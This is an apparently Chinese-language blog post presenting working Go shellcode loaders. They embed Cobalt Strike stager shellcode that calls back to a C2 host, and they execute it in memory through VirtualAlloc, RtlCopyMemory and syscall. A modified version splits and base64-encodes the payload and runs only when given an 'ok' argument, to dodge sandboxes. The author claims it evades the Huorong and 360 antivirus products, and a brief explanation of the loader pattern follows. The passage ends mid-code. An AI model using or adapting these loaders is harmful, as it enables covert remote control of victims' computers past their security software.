<a name="s0Zx0"></a>
## demo1
shellcode是从cs中的c取出来后去除0x的16进制
```
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	//"time"

	//"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	decode1          = "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8991f00004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f536c6a316b77776a665154715547326900f50996231162e71dd0627c34bf9b8399ddd2a9a0a163bdfa0636b0e3f131de7f8ea7bc7ab3d3f966c5f17a4adf70fcf77c03f04f6c26cb0c147c429fd800557365722d4167656e743a204f706572612f392e3830202857696e646f7773204e5420362e313b20574f5736343b204d52535055544e494b204f5720322c20332c20302c20323838292050726573746f2f322e31322e3338382056657273696f6e2f31322e31310d0a002ff32357bbda3be907c6bd5a7598ae9e63c1a3a428d6c0930c3fc20f5b2cdcb90fba181a8d66dfa89ce5c746c006521830376445806b32b1d98a91450a171b1babcd18bb68ea4d99e1ed88cc82a69d4bdb3b99cb7a7be9d0cd47617bb3f048cee08e3824f6bd5b6a0284ef5d7db8385ad949670d89070a540213d01ac05ac1f545aadbefcacccf50886ae058c6271f1c580c0fa59249ab7766ddef1285db6dc5d2583180d7fc64c0973a59a6352b072cf233384c8070d89cd6f2bdad8603169c339edef42f0041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3139322e3136382e3230312e3100000186a0" //16进制字符串代码
)

func happy(decode1 string){
	decode, _ := hex.DecodeString(decode1)
	fmt.Print(decode)
	xor_code := decode

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(xor_code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&xor_code[0])), uintptr(len(xor_code)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)

}

func main() {
			happy(decode1)
		}
```

<a name="hmOy6"></a>
## 魔改版
稍微改了一下，把shellcode分开两段进行加密，然后再合并，不然的话，不知道为什么直接base64解密后，原本16进制的fc4883e4f0e8c8变成了0xfc,0x48这样子的形式，然后程序就报错了，理论上0x也是16进制，但是程序就是报错，只能没有0x才能上线马，用go-strip.exe去除一下编译特征，就轻松过火绒了。<br />然后我稍微添加了点条件判断，输入ok才会进入核心逻辑注入shellcode，否正不会进入逻辑，以此来避免沙箱检测。
```
package main

import (
	"encoding/base64"
	"os"

	//"encoding/base64"
	"encoding/hex"
	//"fmt"
	//"os"
	"syscall"
	//"time"

	//"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	//decode1          = "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8991f00004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f536c6a316b77776a665154715547326900f50996231162e71dd0627c34bf9b8399ddd2a9a0a163bdfa0636b0e3f131de7f8ea7bc7ab3d3f966c5f17a4adf70fcf77c03f04f6c26cb0c147c429fd800557365722d4167656e743a204f706572612f392e3830202857696e646f7773204e5420362e313b20574f5736343b204d52535055544e494b204f5720322c20332c20302c20323838292050726573746f2f322e31322e3338382056657273696f6e2f31322e31310d0a002ff32357bbda3be907c6bd5a7598ae9e63c1a3a428d6c0930c3fc20f5b2cdcb90fba181a8d66dfa89ce5c746c006521830376445806b32b1d98a91450a171b1babcd18bb68ea4d99e1ed88cc82a69d4bdb3b99cb7a7be9d0cd47617bb3f048cee08e3824f6bd5b6a0284ef5d7db8385ad949670d89070a540213d01ac05ac1f545aadbefcacccf50886ae058c6271f1c580c0fa59249ab7766ddef1285db6dc5d2583180d7fc64c0973a59a6352b072cf233384c8070d89cd6f2bdad8603169c339edef42f0041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3139322e3136382e3230312e3100000186a0" //16进制字符串代码
	//decode1       "shellcode here"
)

func happy(decode1 string){
	decode, _ := hex.DecodeString(decode1)
	//fmt.Print(decode)
	xor_code := decode

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(xor_code)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&xor_code[0])), uintptr(len(xor_code)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func deencry() string{
	encodeStr := "ZmM0ODgzZTRmMGU4YzgwMDAwMDA0MTUxNDE1MDUyNTE1NjQ4MzFkMjY1NDg4YjUyNjA0ODhiNTIxODQ4OGI1MjIwNDg4YjcyNTA0ODBmYjc0YTRhNGQzMWM5NDgzMWMwYWMzYzYxN2MwMjJjMjA0MWMxYzkwZDQxMDFjMWUyZWQ1MjQxNTE0ODhiNTIyMDhiNDIzYzQ4MDFkMDY2ODE3ODE4MGIwMjc1NzI4YjgwODgwMDAwMDA0ODg1YzA3NDY3NDgwMWQwNTA4YjQ4MTg0NDhiNDAyMDQ5MDFkMGUzNTY0OGZmYzk0MThiMzQ4ODQ4MDFkNjRkMzFjOTQ4MzFjMGFjNDFjMWM5MGQ0MTAxYzEzOGUwNzVmMTRjMDM0YzI0MDg0NTM5ZDE3NWQ4NTg0NDhiNDAyNDQ5MDFkMDY2NDE4YjBjNDg0NDhiNDAxYzQ5MDFkMDQxOGIwNDg4NDgwMWQwNDE1ODQxNTg1ZTU5NWE0MTU4NDE1OTQxNWE0ODgzZWMyMDQxNTJmZmUwNTg0MTU5NWE0ODhiMTJlOTRmZmZmZmZmNWQ2YTAwNDliZTc3Njk2ZTY5NmU2NTc0MDA0MTU2NDk4OWU2NGM4OWYxNDFiYTRjNzcyNjA3ZmZkNTQ4MzFjOTQ4MzFkMjRkMzFjMDRkMzFjOTQxNTA0MTUwNDFiYTNhNTY3OWE3ZmZkNWViNzM1YTQ4ODljMTQxYjg5OTFmMDAwMDRkMzFjOTQxNTE0MTUxNmEwMzQxNTE0MWJhNTc4OTlmYzZmZmQ1ZWI1OTViNDg4OWMxNDgzMWQyNDk4OWQ4NGQzMWM5NTI2ODAwMDI0MDg0NTI1MjQxYmFlYjU1MmUzYmZmZDU0ODg5YzY0ODgzYzM1MDZhMGE1ZjQ4ODlmMTQ4ODlkYTQ5YzdjMGZmZmZmZmZmNGQzMWM5NTI1MjQxYmEyZDA2MTg3YmZmZDU4NWMwMGY4NTlkMDEwMDAwNDhmZmNmMGY4NDhjMDEwMDA="
	encodeStr2 :="MGViZDNlOWU0MDEwMDAwZThhMmZmZmZmZjJmNTM2YzZhMzE2Yjc3Nzc2YTY2NTE1NDcxNTU0NzMyNjkwMGY1MDk5NjIzMTE2MmU3MWRkMDYyN2MzNGJmOWI4Mzk5ZGRkMmE5YTBhMTYzYmRmYTA2MzZiMGUzZjEzMWRlN2Y4ZWE3YmM3YWIzZDNmOTY2YzVmMTdhNGFkZjcwZmNmNzdjMDNmMDRmNmMyNmNiMGMxNDdjNDI5ZmQ4MDA1NTczNjU3MjJkNDE2NzY1NmU3NDNhMjA0ZjcwNjU3MjYxMmYzOTJlMzgzMDIwMjg1NzY5NmU2NDZmNzc3MzIwNGU1NDIwMzYyZTMxM2IyMDU3NGY1NzM2MzQzYjIwNGQ1MjUzNTA1NTU0NGU0OTRiMjA0ZjU3MjAzMjJjMjAzMzJjMjAzMDJjMjAzMjM4MzgyOTIwNTA3MjY1NzM3NDZmMmYzMjJlMzEzMjJlMzMzODM4MjA1NjY1NzI3MzY5NmY2ZTJmMzEzMjJlMzEzMTBkMGEwMDJmZjMyMzU3YmJkYTNiZTkwN2M2YmQ1YTc1OThhZTllNjNjMWEzYTQyOGQ2YzA5MzBjM2ZjMjBmNWIyY2RjYjkwZmJhMTgxYThkNjZkZmE4OWNlNWM3NDZjMDA2NTIxODMwMzc2NDQ1ODA2YjMyYjFkOThhOTE0NTBhMTcxYjFiYWJjZDE4YmI2OGVhNGQ5OWUxZWQ4OGNjODJhNjlkNGJkYjNiOTljYjdhN2JlOWQwY2Q0NzYxN2JiM2YwNDhjZWUwOGUzODI0ZjZiZDViNmEwMjg0ZWY1ZDdkYjgzODVhZDk0OTY3MGQ4OTA3MGE1NDAyMTNkMDFhYzA1YWMxZjU0NWFhZGJlZmNhY2NjZjUwODg2YWUwNThjNjI3MWYxYzU4MGMwZmE1OTI0OWFiNzc2NmRkZWYxMjg1ZGI2ZGM1ZDI1ODMxODBkN2ZjNjRjMDk3M2E1OWE2MzUyYjA3MmNmMjMzMzg0YzgwNzBkODljZDZmMmJkYWQ4NjAzMTY5YzMzOWVkZWY0MmYwMDQxYmVmMGI1YTI1NmZmZDU0ODMxYzliYTAwMDA0MDAwNDFiODAwMTAwMDAwNDFiOTQwMDAwMDAwNDFiYTU4YTQ1M2U1ZmZkNTQ4OTM1MzUzNDg4OWU3NDg4OWYxNDg4OWRhNDFiODAwMjAwMDAwNDk4OWY5NDFiYTEyOTY4OWUyZmZkNTQ4ODNjNDIwODVjMDc0YjY2NjhiMDc0ODAxYzM4NWMwNzVkNzU4NTg1ODQ4MDUwMDAwMDAwMDUwYzNlODlmZmRmZmZmMzEzOTMyMmUzMTM2MzgyZTMyMzAzMTJlMzEwMDAwMDE4NmEw"
	decodeStr, _ := base64.StdEncoding.DecodeString(encodeStr)
	decodeStr2,_:= base64.StdEncoding.DecodeString(encodeStr2)
	decodeStr3 := string(decodeStr) + string(decodeStr2)
	return decodeStr3
}

func main() {
	//decode1 := "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8991f00004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f536c6a316b77776a665154715547326900f50996231162e71dd0627c34bf9b8399ddd2a9a0a163bdfa0636b0e3f131de7f8ea7bc7ab3d3f966c5f17a4adf70fcf77c03f04f6c26cb0c147c429fd800557365722d4167656e743a204f706572612f392e3830202857696e646f7773204e5420362e313b20574f5736343b204d52535055544e494b204f5720322c20332c20302c20323838292050726573746f2f322e31322e3338382056657273696f6e2f31322e31310d0a002ff32357bbda3be907c6bd5a7598ae9e63c1a3a428d6c0930c3fc20f5b2cdcb90fba181a8d66dfa89ce5c746c006521830376445806b32b1d98a91450a171b1babcd18bb68ea4d99e1ed88cc82a69d4bdb3b99cb7a7be9d0cd47617bb3f048cee08e3824f6bd5b6a0284ef5d7db8385ad949670d89070a540213d01ac05ac1f545aadbefcacccf50886ae058c6271f1c580c0fa59249ab7766ddef1285db6dc5d2583180d7fc64c0973a59a6352b072cf233384c8070d89cd6f2bdad8603169c339edef42f0041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3139322e3136382e3230312e3100000186a0" //16进制字符串代码
	//decode1 :="MHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjOCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwweDU2LDB4NDgsMHgzMSwweGQyLDB4NjUsMHg0OCwweDhiLDB4NTIsMHg2MCwweDQ4LDB4OGIsMHg1MiwweDE4LDB4NDgsMHg4YiwweDUyLDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLDB4ZTIsMHhlZCwweDUyLDB4NDEsMHg1MSwweDQ4LDB4OGIsMHg1MiwweDIwLDB4OGIsMHg0MiwweDNjLDB4NDgsMHgwMSwweGQwLDB4NjYsMHg4MSwweDc4LDB4MTgsMHgwYiwweDAyLDB4NzUsMHg3MiwweDhiLDB4ODAsMHg4OCwweDAwLDB4MDAsMHgwMCwweDQ4LDB4ODUsMHhjMCwweDc0LDB4NjcsMHg0OCwweDAxLDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDQ0LDB4OGIsMHg0MCwweDIwLDB4NDksMHgwMSwweGQwLDB4ZTMsMHg1NiwweDQ4LDB4ZmYsMHhjOSwweDQxLDB4OGIsMHgzNCwweDg4LDB4NDgsMHgwMSwweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsMHgwMywweDRjLDB4MjQsMHgwOCwweDQ1LDB4MzksMHhkMSwweDc1LDB4ZDgsMHg1OCwweDQ0LDB4OGIsMHg0MCwweDI0LDB4NDksMHgwMSwweGQwLDB4NjYsMHg0MSwweDhiLDB4MGMsMHg0OCwweDQ0LDB4OGIsMHg0MCwweDFjLDB4NDksMHgwMSwweGQwLDB4NDEsMHg4YiwweDA0LDB4ODgsMHg0OCwweDAxLDB4ZDAsMHg0MSwweDU4LDB4NDEsMHg1OCwweDVlLDB4NTksMHg1YSwweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLDB4NTksMHg1YSwweDQ4LDB4OGIsMHgxMiwweGU5LDB4NGYsMHhmZiwweGZmLDB4ZmYsMHg1ZCwweDZhLDB4MDAsMHg0OSwweGJlLDB4NzcsMHg2OSwweDZlLDB4NjksMHg2ZSwweDY1LDB4NzQsMHgwMCwweDQxLDB4NTYsMHg0OSwweDg5LDB4ZTYsMHg0YywweDg5LDB4ZjEsMHg0MSwweGJhLDB4NGMsMHg3NywweDI2LDB4MDcsMHhmZiwweGQ1LDB4NDgsMHgzMSwweGM5LDB4NDgsMHgzMSwweGQyLDB4NGQsMHgzMSwweGMwLDB4NGQsMHgzMSwweGM5LDB4NDEsMHg1MCwweDQxLDB4NTAsMHg0MSwweGJhLDB4M2EsMHg1NiwweDc5LDB4YTcsMHhmZiwweGQ1LDB4ZWIsMHg3MywweDVhLDB4NDgsMHg4OSwweGMxLDB4NDEsMHhiOCwweDk5LDB4MWYsMHgwMCwweDAwLDB4NGQsMHgzMSwweGM5LDB4NDEsMHg1MSwweDQxLDB4NTEsMHg2YSwweDAzLDB4NDEsMHg1MSwweDQxLDB4YmEsMHg1NywweDg5LDB4OWYsMHhjNiwweGZmLDB4ZDUsMHhlYiwweDU5LDB4NWIsMHg0OCwweDg5LDB4YzEsMHg0OCwweDMxLDB4ZDIsMHg0OSwweDg5LDB4ZDgsMHg0ZCwweDMxLDB4YzksMHg1MiwweDY4LDB4MDAsMHgwMiwweDQwLDB4ODQsMHg1MiwweDUyLDB4NDEsMHhiYSwweGViLDB4NTUsMHgyZSwweDNiLDB4ZmYsMHhkNSwweDQ4LDB4ODksMHhjNiwweDQ4LDB4ODMsMHhjMywweDUwLDB4NmEsMHgwYSwweDVmLDB4NDgsMHg4OSwweGYxLDB4NDgsMHg4OSwweGRhLDB4NDksMHhjNywweGMwLDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHg0ZCwweDMxLDB4YzksMHg1MiwweDUyLDB4NDEsMHhiYSwweDJkLDB4MDYsMHgxOCwweDdiLDB4ZmYsMHhkNSwweDg1LDB4YzAsMHgwZiwweDg1LDB4OWQsMHgwMSwweDAwLDB4MDAsMHg0OCwweGZmLDB4Y2YsMHgwZiwweDg0LDB4OGMsMHgwMSwweDAwLDB4MDAsMHhlYiwweGQzLDB4ZTksMHhlNCwweDAxLDB4MDAsMHgwMCwweGU4LDB4YTIsMHhmZiwweGZmLDB4ZmYsMHgyZiwweDUzLDB4NmMsMHg2YSwweDMxLDB4NmIsMHg3NywweDc3LDB4NmEsMHg2NiwweDUxLDB4NTQsMHg3MSwweDU1LDB4NDcsMHgzMiwweDY5LDB4MDAsMHhmNSwweDA5LDB4OTYsMHgyMywweDExLDB4NjIsMHhlNywweDFkLDB4ZDAsMHg2MiwweDdjLDB4MzQsMHhiZiwweDliLDB4ODMsMHg5OSwweGRkLDB4ZDIsMHhhOSwweGEwLDB4YTEsMHg2MywweGJkLDB4ZmEsMHgwNiwweDM2LDB4YjAsMHhlMywweGYxLDB4MzEsMHhkZSwweDdmLDB4OGUsMHhhNywweGJjLDB4N2EsMHhiMywweGQzLDB4ZjksMHg2NiwweGM1LDB4ZjEsMHg3YSwweDRhLDB4ZGYsMHg3MCwweGZjLDB4ZjcsMHg3YywweDAzLDB4ZjAsMHg0ZiwweDZjLDB4MjYsMHhjYiwweDBjLDB4MTQsMHg3YywweDQyLDB4OWYsMHhkOCwweDAwLDB4NTUsMHg3MywweDY1LDB4NzIsMHgyZCwweDQxLDB4NjcsMHg2NSwweDZlLDB4NzQsMHgzYSwweDIwLDB4NGYsMHg3MCwweDY1LDB4NzIsMHg2MSwweDJmLDB4MzksMHgyZSwweDM4LDB4MzAsMHgyMCwweDI4LDB4NTcsMHg2OSwweDZlLDB4NjQsMHg2ZiwweDc3LDB4NzMsMHgyMCwweDRlLDB4NTQsMHgyMCwweDM2LDB4MmUsMHgzMSwweDNiLDB4MjAsMHg1NywweDRmLDB4NTcsMHgzNiwweDM0LDB4M2IsMHgyMCwweDRkLDB4NTIsMHg1MywweDUwLDB4NTUsMHg1NCwweDRlLDB4NDksMHg0YiwweDIwLDB4NGYsMHg1NywweDIwLDB4MzIsMHgyYywweDIwLDB4MzMsMHgyYywweDIwLDB4MzAsMHgyYywweDIwLDB4MzIsMHgzOCwweDM4LDB4MjksMHgyMCwweDUwLDB4NzIsMHg2NSwweDczLDB4NzQsMHg2ZiwweDJmLDB4MzIsMHgyZSwweDMxLDB4MzIsMHgyZSwweDMzLDB4MzgsMHgzOCwweDIwLDB4NTYsMHg2NSwweDcyLDB4NzMsMHg2OSwweDZmLDB4NmUsMHgyZiwweDMxLDB4MzIsMHgyZSwweDMxLDB4MzEsMHgwZCwweDBhLDB4MDAsMHgyZiwweGYzLDB4MjMsMHg1NywweGJiLDB4ZGEsMHgzYiwweGU5LDB4MDcsMHhjNiwweGJkLDB4NWEsMHg3NSwweDk4LDB4YWUsMHg5ZSwweDYzLDB4YzEsMHhhMywweGE0LDB4MjgsMHhkNiwweGMwLDB4OTMsMHgwYywweDNmLDB4YzIsMHgwZiwweDViLDB4MmMsMHhkYywweGI5LDB4MGYsMHhiYSwweDE4LDB4MWEsMHg4ZCwweDY2LDB4ZGYsMHhhOCwweDljLDB4ZTUsMHhjNywweDQ2LDB4YzAsMHgwNiwweDUyLDB4MTgsMHgzMCwweDM3LDB4NjQsMHg0NSwweDgwLDB4NmIsMHgzMiwweGIxLDB4ZDksMHg4YSwweDkxLDB4NDUsMHgwYSwweDE3LDB4MWIsMHgxYiwweGFiLDB4Y2QsMHgxOCwweGJiLDB4NjgsMHhlYSwweDRkLDB4OTksMHhlMSwweGVkLDB4ODgsMHhjYywweDgyLDB4YTYsMHg5ZCwweDRiLDB4ZGIsMHgzYiwweDk5LDB4Y2IsMHg3YSwweDdiLDB4ZTksMHhkMCwweGNkLDB4NDcsMHg2MSwweDdiLDB4YjMsMHhmMCwweDQ4LDB4Y2UsMHhlMCwweDhlLDB4MzgsMHgyNCwweGY2LDB4YmQsMHg1YiwweDZhLDB4MDIsMHg4NCwweGVmLDB4NWQsMHg3ZCwweGI4LDB4MzgsMHg1YSwweGQ5LDB4NDksMHg2NywweDBkLDB4ODksMHgwNywweDBhLDB4NTQsMHgwMiwweDEzLDB4ZDAsMHgxYSwweGMwLDB4NWEsMHhjMSwweGY1LDB4NDUsMHhhYSwweGRiLDB4ZWYsMHhjYSwweGNjLDB4Y2YsMHg1MCwweDg4LDB4NmEsMHhlMCwweDU4LDB4YzYsMHgyNywweDFmLDB4MWMsMHg1OCwweDBjLDB4MGYsMHhhNSwweDkyLDB4NDksMHhhYiwweDc3LDB4NjYsMHhkZCwweGVmLDB4MTIsMHg4NSwweGRiLDB4NmQsMHhjNSwweGQyLDB4NTgsMHgzMSwweDgwLDB4ZDcsMHhmYywweDY0LDB4YzAsMHg5NywweDNhLDB4NTksMHhhNiwweDM1LDB4MmIsMHgwNywweDJjLDB4ZjIsMHgzMywweDM4LDB4NGMsMHg4MCwweDcwLDB4ZDgsMHg5YywweGQ2LDB4ZjIsMHhiZCwweGFkLDB4ODYsMHgwMywweDE2LDB4OWMsMHgzMywweDllLDB4ZGUsMHhmNCwweDJmLDB4MDAsMHg0MSwweGJlLDB4ZjAsMHhiNSwweGEyLDB4NTYsMHhmZiwweGQ1LDB4NDgsMHgzMSwweGM5LDB4YmEsMHgwMCwweDAwLDB4NDAsMHgwMCwweDQxLDB4YjgsMHgwMCwweDEwLDB4MDAsMHgwMCwweDQxLDB4YjksMHg0MCwweDAwLDB4MDAsMHgwMCwweDQxLDB4YmEsMHg1OCwweGE0LDB4NTMsMHhlNSwweGZmLDB4ZDUsMHg0OCwweDkzLDB4NTMsMHg1MywweDQ4LDB4ODksMHhlNywweDQ4LDB4ODksMHhmMSwweDQ4LDB4ODksMHhkYSwweDQxLDB4YjgsMHgwMCwweDIwLDB4MDAsMHgwMCwweDQ5LDB4ODksMHhmOSwweDQxLDB4YmEsMHgxMiwweDk2LDB4ODksMHhlMiwweGZmLDB4ZDUsMHg0OCwweDgzLDB4YzQsMHgyMCwweDg1LDB4YzAsMHg3NCwweGI2LDB4NjYsMHg4YiwweDA3LDB4NDgsMHgwMSwweGMzLDB4ODUsMHhjMCwweDc1LDB4ZDcsMHg1OCwweDU4LDB4NTgsMHg0OCwweDA1LDB4MDAsMHgwMCwweDAwLDB4MDAsMHg1MCwweGMzLDB4ZTgsMHg5ZiwweGZkLDB4ZmYsMHhmZiwweDMxLDB4MzksMHgzMiwweDJlLDB4MzEsMHgzNiwweDM4LDB4MmUsMHgzMiwweDMwLDB4MzEsMHgyZSwweDMxLDB4MDAsMHgwMCwweDAxLDB4ODYsMHhhMCw="
	//decodeStr, _ := base64.StdEncoding.DecodeString(decode1)
	for index,v := range os.Args {
		if index == 1 && v == "ok" {
			//time.Sleep(10 * time.Second)
			//decode1 =deencry(decodeStr)
			happy(deencry())
		}
	}
}
```

这个马动静态过火绒、360<br />![0441ac9588b3fcbf0f949383d7209c4.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/1345801/1667100193511-aee609a6-f5a1-4602-8990-daaec732ddcc.jpeg#clientId=u0b28f4b7-01ba-4&from=paste&height=497&id=ubcb415ea&originHeight=621&originWidth=1375&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116403&status=done&style=none&taskId=u5b3c27be-0f0a-4e96-bec7-544e0eedbc8&title=&width=1100)

![6cd844409cf24bcdcb9d82474fc7225.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/1345801/1667146882277-0dcbb5bf-fc0b-4989-a795-bf65b3e2f63c.jpeg#clientId=u0b28f4b7-01ba-4&from=paste&height=590&id=udeb6e997&originHeight=738&originWidth=1314&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129479&status=done&style=none&taskId=u3e8e451b-c0a5-4749-918e-da8d142d430&title=&width=1051.2)
<a name="yNorm"></a>
## 源码解读

VirtualAlloc是分配内存，就是根据传进来的shellcode分配<br />RtlCopyMemory是将shellcode导入到内存中<br />syscall 是将注入到内存中的shellcode执行，从而上线远端C2<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667140429078-4879a0d7-6d7a-47ff-bb8a-4ac9344f7b56.png#clientId=u0b28f4b7-01ba-4&from=paste&height=199&id=u11635cbb&originHeight=249&originWidth=1040&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24754&status=done&style=none&taskId=uc6cb8706-e96e-41de-951e-0c0ee518569&title=&width=832)

其实也就是说 go的shellcode加载器，有好几种组合拳的方法，例如  申请内存空间+导入内存+调用执行<br />申请内存空间：VirtualAlloc、VirtualAlloc2、VirtualAllocEx<br />导入内存：RtlCopyMemory、RtlCopyBytes、RtlMoveMemory<br />调用执行：创建线程的方式执行、用syscall调用执行、内嵌C代码执行

[https://www.freebuf.com/articles/network/228795.html](https://www.freebuf.com/articles/network/228795.html) 从二进制角度上分析shellcode加载器执行的规律
<a name="YIf5f"></a>
### 关于go shellcode加载器的一些方法解读
[利用go语言进行免杀的学习 (2022_10_30 22_19_43).html](https://www.yuque.com/attachments/yuque/0/2022/html/1345801/1667139676215-25db9da8-55d5-4f32-babe-c35f18ce39c0.html?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2022%2Fhtml%2F1345801%2F1667139676215-25db9da8-55d5-4f32-babe-c35f18ce39c0.html%22%2C%22name%22%3A%22%E5%88%A9%E7%94%A8go%E8%AF%AD%E8%A8%80%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0%20(2022_10_30%2022_19_43).html%22%2C%22size%22%3A717793%2C%22type%22%3A%22text%2Fhtml%22%2C%22ext%22%3A%22html%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u8c5440b4-8e94-49cc-ac79-8575a4b8820%22%2C%22taskType%22%3A%22upload%22%2C%22__spacing%22%3A%22both%22%2C%22id%22%3A%22c0uMk%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)

<a name="enkJd"></a>
## 字符串转16进制代码
decode1 := "fc4883e4f0e8c8000000" 这一段其实是16进制，转换关系如下<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1667145408174-f53e499a-baa1-4c63-a23e-e198f40ae1bf.png#clientId=u0b28f4b7-01ba-4&from=paste&height=474&id=ud680041d&originHeight=593&originWidth=841&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53604&status=done&style=none&taskId=ue5d217ec-f527-4600-99f3-bba5ce59081&title=&width=672.8)
```
package main

import (
	//"encoding/base64"
	"encoding/hex"
	"fmt"
)

func main(){
	//var a string = "t"
	var b []byte = []byte("afeng_good")
	sDec:= hex.EncodeToString(b)
	fmt.Println("输入的字符串加密后的hex编码： ",string((sDec)))

	data1, _ := hex.DecodeString(string((sDec)))
	for _,v:=range data1{
